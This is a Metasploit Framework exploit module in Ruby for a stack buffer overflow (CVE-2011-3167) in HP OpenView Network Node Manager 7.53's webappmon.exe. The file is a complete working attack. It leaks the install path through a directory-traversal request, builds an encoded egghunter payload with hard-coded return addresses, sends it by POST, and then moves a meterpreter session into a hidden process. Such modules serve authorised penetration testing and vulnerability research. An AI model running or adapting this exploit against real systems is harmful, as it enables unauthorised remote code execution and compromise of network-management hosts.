##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    HttpFingerPrint = { :method => 'HEAD', :uri => '/OvCgi/webappmon.exe', :pattern => /Hewlett-Packard Development Company/ }
 
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::Egghunter
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => 'HP OpenView Network Node Manager ov.dll _OVBuildPath Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in HP OpenView Network Node
                Manager 7.53 prior to NNM_01213 without the SSRT100649 hotfix. By specifying a long
                'textFile' argument when calling the 'webappmon.exe' CGI program, an attacker can
                cause a stack-based buffer overflow and execute arbitrary code.
 
                The vulnerable code is within the "_OVBuildPath" function within "ov.dll". There
                are no stack cookies, so exploitation is achieved by overwriting the saved return
                address.
 
                The vulnerability is due to the use of the function "_OVConcatPath" which finally
                uses "strcat" in a insecure way. User controlled data is concatenated to a string
                which contains the OpenView installation path.
 
                To achieve reliable exploitation a directory traversal in OpenView5.exe
                (OSVDB 44359) is being used to retrieve OpenView logs and disclose the installation
                path. If the installation path cannot be guessed the default installation path
                is used.
            } ,
            'Author'         =>
                [
                    'Anyway <Aniway.Anyway[at]gmail.com>', # Vulnerability Discovery
                    'juan vazquez', # Metasploit module
                    'sinn3r' # Metasploit fu
                ],
            'License'     => MSF_LICENSE,
            'References' =>
                [
                    [ 'CVE', '2011-3167' ],
                    [ 'OSVDB', '76775' ],
                    [ 'BID', '50471' ],
                    [ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-12-002/' ],
                    [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03054052' ]
                ],
            'Payload'    =>
                {
                    'Space' => 950,
                    'BadChars' => [*(0x00..0x09)].pack("C*") + [*(0x0b..0x23)].pack("C*") + [0x26, 0x2b, 0x3c, 0x3e, 0x5b, 0x5d, 0x5e, 0x60, 0x7e, 0x7f].pack("C*"),
                    'DisableNops' => true,
                    'EncoderOptions' =>
                        {
                            'BufferRegister'  => 'EDI' # Egghunter jmp edi
                        }
                },
            'Platform' => 'win',
            'Targets'    =>
                [
                    [ 'HP OpenView Network Node Manager 7.53 / Windows 2000 SP4 & Windows XP SP3',
                        # Patches installed:
                        # * ECS_00048
                        # * NNM_01128
                        # * NNM_01172
                        # * NNM_01187
                        {
                            'Offset'    => 1067,
                            'Ret'       => 0x5a41656a, # pop/pop/ret - in ov.dll (v1.30.5.8002)
                            'JmpESP'    => 0x5a4251c5, # call esp - in ov.dll
                            'EggAdjust' => 4,
                            'ReadableAddress' => 0x5a466930 # ov.dll
                        }
                    ]
                ],
            'DefaultTarget' => 0,
            'DisclosureDate' => 'Nov 01 2011'))
 
        register_options(
            [
                Opt::RPORT(80),
            ], self.class)
    end
 
    # The following code allows to migrate if having into account
    # that over Windows XP permissions aren't granted on %windir%\system32
    #
    # Code ripped from "modules/post/windows/manage/migrate.rb". See it
    # for more information
    def on_new_session(client)
 
        if client.type != "meterpreter"
            print_error("NOTE: you must use a meterpreter payload in order to process migration.")
            return
        end
 
        client.core.use("stdapi") if not client.ext.aliases.include?("stdapi")
 
        # Select path and executable to run depending the architecture
        # and the operating system
        if client.sys.config.sysinfo["OS"] =~ /Windows XP/
            windir = client.fs.file.expand_path("%ProgramFiles%")
            cmd="#{windir}\\Windows NT\\Accessories\\wordpad.exe"
        else # Windows 2000
            windir = client.fs.file.expand_path("%windir%")
            if client.sys.config.sysinfo['Architecture'] =~ /x86/
                cmd = "#{windir}\\System32\\notepad.exe"
            else
                cmd = "#{windir}\\Sysnative\\notepad.exe"
            end
        end
 
        # run hidden
        print_status("Spawning #{cmd.split("\\").last} process to migrate to")
        proc = client.sys.process.execute(cmd, nil, {'Hidden' => true })
        target_pid = proc.pid
 
        begin
            print_good("Migrating to #{target_pid}")
            client.core.migrate(target_pid)
            print_good("Successfully migrated to process #{target_pid}")
        rescue ::Exception => e
            print_error("Could not migrate in to process.")
            print_error(e.to_s)
        end
 
    end
 
    # Tries to guess the HP OpenView install dir via the Directory traversal identified
    # by OSVDB 44359.
    # If OSVDB 44359 doesn't allow to retrieve the installation path the default one
    # (C:\Program Files\HP OpenView\) is used.
    # Directory Traversal used:
    # http://host/OvCgi/OpenView5.exe?Context=Snmp&Action=../../../log/setup.log
    def get_install_path
 
        cgi = '/OvCgi/OpenView5.exe'
        web_session = rand_text_numeric(3)
        my_cookie = "OvOSLocale=English_United States.1252; "
        my_cookie << "OvAcceptLang=en-US; "
        my_cookie << "OvJavaLocale=en_US.Cp1252; "
        my_cookie << "OvWebSession=#{web_session}:AnyUser:"
 
        payload = "../../../log/setup.log"
        res = send_request_cgi({
            'uri'         => cgi,
            'cookie' => my_cookie,
            'method'      => "GET",
            'vars_get' =>
                {
                    'Target' => "Main",
                    'Scope' => "Snmp",
                    'Action' => payload
                }
        }, 5)
 
        installation_path = ""
        if res and res.code == 200 and
                res.body =~ /([A-Z]:\\.*\\)log/
            print_status("Installation Path Found in #{$1}")
            installation_path = $1
        else
            print_status("Installation Path Not Found using the default")
            installation_path = "C:\\Program Files\\HP OpenView\\"
        end
 
        return installation_path
    end
 
    def exploit
        print_status("Trying target #{target.name}...")
 
        install_path = get_install_path
        install_path << "help\\English_United States.1252"
 
        eggoptions = {
            :checksum => true,
        }
        hunter,egg = generate_egghunter(payload.encoded, payload_badchars, eggoptions)
 
        [ 'x86/alpha_mixed'].each { |name|
            enc = framework.encoders.create(name)
            if name =~/alpha/
                # If control is transferred to the decoder via "call esp" BufferOfset
                # shoulds be adjusted.
                if target["EggAdjust"] and target["EggAdjust"] > 0
                    enc_options = {
                        'BufferRegister' => 'ESP',
                        'BufferOffset' => target["EggAdjust"]
                    }
                    enc.datastore.import_options_from_hash(enc_options)
                else
                    enc.datastore.import_options_from_hash({ 'BufferRegister' => 'ESP' })
                end
            end
            hunter = enc.encode(hunter, nil, nil, platform)
        }
 
        offset = target['Offset'] - install_path.length - egg.length
 
        my_payload = egg
        my_payload << rand_text_alphanumeric(offset)
        my_payload << [target.ret].pack("V")
        my_payload << rand_text_alphanumeric(4) # Padding
        my_payload << [target["ReadableAddress"]].pack("V")
        my_payload << [target["JmpESP"]].pack("V")
        my_payload << hunter
 
        buf = "-textFile+#{my_payload}+++++++++++++++++++++++"
        buf << "-appendSelectList+-appendSelectListToTitle+%09%09++++++"
        buf << "-commandHeading+%22Protocol+++++++++Port++++++++Service%22+++++++++++++++++++++++"
        buf << "-dataLine+2+"
        buf << "-commandTitle+%22Services%22+%09%09++++++"
        buf << "-iconName+%22Services%22+++++++++++++++++++++++"
        buf << "-cmd+rnetstat+"
        buf << "-S"
 
        web_session = rand_text_numeric(3)
        my_cookie = "OvOSLocale=English_United States.1252; "
        my_cookie << "OvAcceptLang=en-US; "
        my_cookie << "OvJavaLocale=en_US.Cp1252; "
        my_cookie << "OvWebSession=#{web_session}:AnyUser:"
 
        cgi = '/OvCgi/webappmon.exe'
 
        res = send_request_cgi({
            'uri'       => cgi,
            'cookie'    => my_cookie,
            'method'    => "POST",
            'vars_post' =>
                {
                    'ins' => 'nowait',
                    'sel' => rand_text_alphanumeric(15),
                    'app' => 'IP Tables',
                    'act' => 'Services',
                    'help' => '',
                    'cache' => rand_text_numeric(4)
                },
            'data' => "arg=#{buf}" # Avoid uri encoding
        }, 3)
 
        if res and res.code != 502
            print_error("Eek! We weren't expecting a response, but we got one")
            if datastore['DEBUG']
                print_line()
                print_error(res.inspect)
            end
        end
 
        handler
 
    end
 
end
 
=begin
 
* migrate to %windir%/system32/notepad.exe fails on Windows XP SP3
 
meterpreter > run post/windows/manage/migrate
 
[*] Running module against HOME-F006222D6C
[*] Current server process: webappmon.exe (7064)
[*] Spawning notepad.exe process to migrate to
[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: Access is denied.
[-] Call stack:
[-]   /projects/exploiting/trunk/lib/rex/post/meterpreter/extensions/stdapi/sys/process.rb:163:in `execute'
[-]   (eval):80:in `create_temp_proc'
[-]   (eval):49:in `run'
=end
